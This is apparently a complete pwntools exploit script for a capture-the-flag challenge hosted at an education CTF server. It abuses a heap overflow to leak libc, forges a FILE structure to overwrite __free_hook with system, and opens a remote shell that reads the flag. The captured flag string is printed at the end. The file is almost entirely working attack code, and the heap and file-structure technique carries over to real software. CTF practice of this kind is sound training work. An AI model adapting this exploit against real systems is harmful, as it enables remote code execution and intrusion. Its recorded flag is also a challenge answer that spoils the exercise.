from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
r = remote('edu-ctf.zoolab.org', 10011)

# r = process("./share/chal")
# gdb.attach(r)

def add(idx, username):
    global r
    r.sendlineafter("5. bye\n> ", str(1))
    r.sendlineafter("index\n> ", str(idx))
    r.sendlineafter("username\n> ", username)
    r.recvuntil("success!\n")

def edit(idx, size, data):
    global r
    r.sendlineafter("5. bye\n> ", str(2))
    r.sendlineafter("index\n> ", str(idx))
    r.sendlineafter("size\n> ", str(size))
    r.send(data)
    r.recvuntil("success!\n")

def delete(idx):
    r.sendlineafter("5. bye\n> ", str(3))
    r.sendlineafter("index\n> ", str(idx))
    r.recvuntil("success!\n")

def show():
    r.sendlineafter("5. bye\n> ", str(4))
    r.recvuntil("1. add_user\n")
    data = r.recvuntil("1. add_user\n")
    return data

add(0, b'A'*0x10)
edit(0, 0x18, b'B'*0x18)
add(1, b'B'*0x10)
edit(1, 0x18, b'DEADBEEF')
delete(1)
edit(0, 0x1d8, b'C'*0xd8)
add(1, b'B'*0x10) # prevent error from fseek

vtable_offset = 0x1e94a0
free_hook_offset = 0x1eee48
system_offset = 0x52290

print(f"vtable offset : {hex(vtable_offset)}")
# leak libc
leak = show()
libc = u64(leak.split(b"\n1. add_user\n")[0][-6:].ljust(8, b'\x00')) - vtable_offset
system = libc + system_offset
free_hook = libc + free_hook_offset

print(f"libc addr: {hex(libc)}")
print(f"free hook addr: {hex(free_hook)}")
print(f"system addr: {hex(system)}")

garbage = b'A'*0x8
flags = 0xfbad0000
read_ptr = 0
read_end = 0
read_base = 0
write_base = free_hook
write_ptr = 0
write_end = 0
buf_base = free_hook
buf_end = free_hook + 0x1100
chain = garbage
fileno = 0

fake_file = flat(
    flags, read_ptr,
    read_end, read_base,
    write_base, write_ptr,
    write_end, buf_base,
    buf_end, 0,
    0, 0,
    0, chain,
    fileno
)

add(2, b'/bin/sh\x00')
edit(2, 0x18, b'A')
add(3, b'B'*0x10)
edit(3, 0x18, b'B'*0x18)
delete(3)
edit(2, 0x1d8, fake_file)

r.sendlineafter("5. bye\n> ", str(4))
r.recvuntil('\ndata: ')
r.recvuntil('\ndata: ')

# add a lot of nullbytes to make sure our data is received
r.sendline(flat(system)+b'\x00'*0x1000) 
r.interactive()
# 1. manually execute delete(2)
# 2. cat /home/chal/flag

# FLAG{Toyz_4y2m_QQ_6a61c7e00afda47e65f4aaedc62e4fdc}